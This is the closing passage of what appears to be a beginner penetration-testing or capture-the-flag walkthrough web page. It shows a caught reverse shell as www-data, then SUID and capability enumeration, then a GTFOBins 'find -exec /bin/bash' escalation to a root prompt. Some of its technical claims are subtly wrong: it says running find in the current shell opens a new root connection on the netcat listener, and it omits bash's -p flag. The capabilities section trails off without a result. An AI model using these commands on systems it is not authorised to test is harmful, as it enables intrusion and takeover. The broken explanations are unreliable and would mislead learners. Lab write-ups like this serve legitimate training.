<span class="n">Connection</span><span class="w"> </span><span class="n">received</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.10</span><span class="w"> </span><span class="mi">48870</span>
<span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="p">:</span><span class="w"> </span><span class="n">cannot</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">terminal</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="n">group</span><span class="p">:</span><span class="w"> </span><span class="n">Inappropriate</span><span class="w"> </span><span class="n">ioctl</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">device</span>
<span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="p">:</span><span class="w"> </span><span class="n">no</span><span class="w"> </span><span class="n">job</span><span class="w"> </span><span class="n">control</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">shell</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">$</span>
</code></pre></div>

<p><strong>ðŸ§  Beginner Analysis</strong></p>
<ul>
<li><strong><code>Connection received from 10.10.10.10 48870</code></strong>: Our <code>netcat</code> listener successfully received a connection from the target machine.</li>
<li><strong><code>www-data@ubuntu:/var/www/html$</code></strong>: We are now at a command prompt, and the prompt tells us we are the <code>www-data</code> user and are currently in the web server's root directory. We have a fully interactive shell!</li>
</ul>
<h2>Privilege Escalation</h2>
<p>We currently have a shell as the <code>www-data</code> user, which is a low-privileged user. Our goal is to become a more powerful user, typically <code>root</code>.</p>
<h3>Linux Capabilities</h3>
<p>Sometimes, Linux executables have "capabilities" set that allow them to perform actions usually reserved for the root user, even when run by a less privileged user. We can check for these using <code>getcap</code>.</p>
<div class="codehilite"><pre><span></span><code>getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
</code></pre></div>

<p><strong>ðŸ§  Beginner Analysis</strong></p>
<ul>
<li><strong><code>getcap -r /</code></strong>: This command recursively searches the entire file system (<code>/</code>) for files that have Linux capabilities set.</li>
<li><strong><code>2&gt;/dev/null</code></strong>: This redirects any error messages (like "Permission denied") to <code>/dev/null</code>, so we only see the actual capability information.</li>
</ul>
<p>Let's say <code>getcap</code> outputs something like this:</p>
<div class="codehilite"><pre><span></span><code>/usr/bin/python3 = cap_net_raw,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
</code></pre></div>

<p><strong>ðŸ§  Beginner Analysis</strong></p>
<ul>
<li><strong><code>/usr/bin/python3 = cap_net_raw,cap_net_admin+ep</code></strong>: This is very interesting. The <code>python3</code> executable has capabilities that allow it to perform raw network operations (<code>cap_net_raw</code>) and manage network interfaces (<code>cap_net_admin</code>). This is unusual for a standard Python interpreter.</li>
</ul>
<h3>Exploiting Python Capabilities</h3>
<p>Normally, a user cannot run arbitrary code with elevated privileges. However, if an executable has specific capabilities, it might allow for privilege escalation. In this case, the <code>cap_net_raw</code> and <code>cap_net_admin</code> capabilities, while related to networking, can sometimes be leveraged.</p>
<p>A more direct way to exploit capabilities is when an executable can be manipulated to run other programs. If we find an executable with <code>cap_sys_ptrace</code> or <code>cap_dac_override</code> for example, we could potentially use that.</p>
<p>However, let's consider a more common scenario based on <em>finding</em> specific vulnerabilities that <code>getcap</code> might not reveal directly, but we might find through other enumeration techniques (like SUID binaries or misconfigured services).</p>
<h3>Finding SUID Binaries</h3>
<p>SUID (Set User ID) bits on executables allow a user to run a program with the permissions of the file's owner, rather than their own. If a binary owned by <code>root</code> has the SUID bit set, and it's vulnerable, we can exploit it to gain root privileges.</p>
<p>We can search for these with <code>find</code>:</p>
<div class="codehilite"><pre><span></span><code>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-u<span class="o">=</span>s<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
</code></pre></div>

<p><strong>ðŸ§  Beginner Analysis</strong></p>
<ul>
<li><strong><code>find /</code></strong>: Search starting from the root directory.</li>
<li><strong><code>-perm -u=s</code></strong>: This is the key. It looks for files where the SUID bit (<code>u=s</code>) is set. The <code>-</code> means "at least these permissions are set".</li>
<li><strong><code>-type f</code></strong>: Ensures we are only looking for files, not directories.</li>
<li><strong><code>2&gt;/dev/null</code></strong>: Suppresses permission denied errors.</li>
</ul>
<p>Suppose this command reveals:</p>
<div class="codehilite"><pre><span></span><code>/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/find
</code></pre></div>

<p><strong>ðŸ§  Beginner Analysis</strong></p>
<ul>
<li><strong><code>/usr/bin/sudo</code></strong>: This is expected. Sudo is designed to allow authorized users to run commands as root. If we can find a way to abuse <code>sudo</code>, that's a direct path to root.</li>
<li><strong><code>/usr/bin/find</code></strong>: This is interesting! The <code>find</code> command, when run with the SUID bit set, can be powerful. If <code>find</code> can be tricked into executing arbitrary commands, we could gain root.</li>
</ul>
<h3>Exploiting <code>find</code> SUID</h3>
<p>GTFOBins is an excellent resource for finding SUID exploits. We can check if <code>find</code> can be used to execute commands.</p>
<p>According to GTFOBins, <code>find</code> can be exploited by using the <code>-exec</code> option creatively.</p>
<div class="codehilite"><pre><span></span><code>find<span class="w"> </span>.<span class="w"> </span>-exec<span class="w"> </span>/bin/bash<span class="w"> </span><span class="se">\;</span><span class="w"> </span>-quit
</code></pre></div>

<p>Let's try this from our current shell:</p>
<div class="codehilite"><pre><span></span><code>find<span class="w"> </span>/tmp/<span class="w"> </span>-exec<span class="w"> </span>/bin/bash<span class="w"> </span><span class="se">\;</span><span class="w"> </span>-quit
</code></pre></div>

<p><strong>ðŸ§  Beginner Analysis</strong></p>
<ul>
<li><strong><code>find /tmp/</code></strong>: We're telling <code>find</code> to start searching in the <code>/tmp</code> directory.</li>
<li><strong><code>-exec /bin/bash \;</code></strong>: This is the crucial part. The <code>-exec</code> option allows <code>find</code> to run a command. Here, we're telling <code>find</code> to execute <code>/bin/bash</code>. Because <code>find</code> is running with root privileges (due to the SUID bit), the <code>/bin/bash</code> it executes will also have root privileges.</li>
<li><strong><code>-quit</code></strong>: This tells <code>find</code> to exit immediately after the first execution, making it faster and cleaner.</li>
</ul>
<p>If this command is successful, our <code>netcat</code> listener will receive a <em>new</em> connection, this time with root privileges!</p>
<div class="codehilite"><pre><span></span><code><span class="n">Listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="o">[</span><span class="n">0.0.0.0</span><span class="o">]</span><span class="w"> </span><span class="p">(</span><span class="n">family</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="mi">4444</span><span class="p">)</span>
<span class="k">Connection</span><span class="w"> </span><span class="n">received</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="mf">10.10.10.10</span><span class="w"> </span><span class="mi">49122</span>
<span class="n">root</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">#</span>
</code></pre></div>

<p><strong>ðŸ§  Beginner Analysis</strong></p>
<ul>
<li><strong><code>root@ubuntu:/tmp#</code></strong>: We have successfully escalated our privileges to <code>root</code>! We are now the administrator of the system and can perform any action.</li>
</ul>
<p>This concludes our walkthrough. We've journeyed from initial reconnaissance to gaining root access, learning about network scanning, web enumeration, API interaction, FTP misconfigurations, web shells, reverse shells, and SUID exploitation. Keep practicing these steps, and you'll become proficient in penetration testing!</p>
        </div>
    </main>

    <!-- Footer -->
    <footer class="py-16 text-center border-t border-slate-800 bg-transparent mt-24 relative overflow-hidden">
        <div class="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
            <div class="diag-card text-left">
                <span class="diag-label">Access_Level</span>
                <span class="diag-value">OMNI_READ_ONLY</span>
            </div>
            <div class="diag-card text-left">
                <span class="diag-label">Encryption</span>
                <span class="diag-value">AES-256-GCM<span class="diag-blink">_</span></span>
            </div>
            <div class="diag-card text-left">
                <span class="diag-label">Signal_Strength</span>
                <span class="diag-value text-blue-400">PURE_DATA_STREAM</span>
            </div>
            <div class="diag-card text-left">
                <span class="diag-label">System_Status</span>
                <span class="diag-value">STABLE_HARDENED</span>
            </div>
        </div>

        <div class="flex justify-center gap-6 mb-8">
            <a href="https://github.com/kalialucard" target="_blank"
                class="text-slate-400 hover:text-white transition-colors text-2xl" aria-label="GitHub"><i
                    class="fa-brands fa-github"></i></a>
            <a href="https://tryhackme.com/p/kalialucard" target="_blank"
                class="text-slate-400 hover:text-red-500 transition-colors text-2xl" aria-label="TryHackMe"
                title="TryHackMe"><i class="fa-solid fa-fire"></i></a>
            <a href="https://app.hackthebox.com/profile/2503089" target="_blank"
                class="text-slate-400 hover:text-green-400 transition-colors text-2xl" aria-label="HackTheBox"
                title="HackTheBox"><i class="fa-solid fa-cube"></i></a>
        </div>
        <p class="font-mono text-[10px] text-slate-600 uppercase tracking-widest text-center">Powered by kalialucard</p>
    </footer>

    <script src="../js/main.js"></script>
</body>
</html>